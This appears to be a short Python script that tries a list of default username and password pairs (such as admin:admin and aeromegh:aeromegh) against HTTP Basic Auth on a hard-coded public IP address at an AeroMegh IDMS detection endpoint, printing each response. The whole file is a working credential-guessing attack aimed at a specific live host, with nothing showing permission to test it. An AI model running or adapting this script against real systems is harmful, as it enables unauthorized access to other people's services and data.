import requests
from requests.auth import HTTPBasicAuth

url = "http://114.143.215.196:5005/AeroMegh/idms/detection/pending"

credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("aeromegh", "aeromegh"),
    ("idms", "idms"),
    ("user", "password"),
]

for username, password in credentials:
    try:
        response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=10)
        print(f"Trying {username}:{password} -> Status: {response.status_code}, Response: {response.text[:200]}")
    except Exception as e:
        print(f"Error for {username}:{password} -> {e}")
